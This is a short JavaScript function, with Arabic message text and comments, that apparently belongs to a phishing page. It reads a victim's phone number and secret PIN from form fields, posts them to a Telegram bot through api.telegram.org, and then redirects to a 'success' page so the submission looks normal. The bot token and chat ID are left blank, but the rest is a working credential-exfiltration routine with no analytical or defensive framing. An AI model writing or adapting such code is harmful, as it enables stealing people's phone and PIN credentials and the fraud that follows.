function sendToTelegram() {
    const token = '';
    const chatId = '';
    const phone = document.getElementById('phone').value;
    const pin = document.getElementById('pin').value;

    const message = `رقم الهاتف: ${phone}\nالرمز السري: ${pin}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            window.location.href = 'success.html'; // انتقال إلى صفحة النجاح بعد الإرسال
        } else {
            console.error('Error:', data);
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
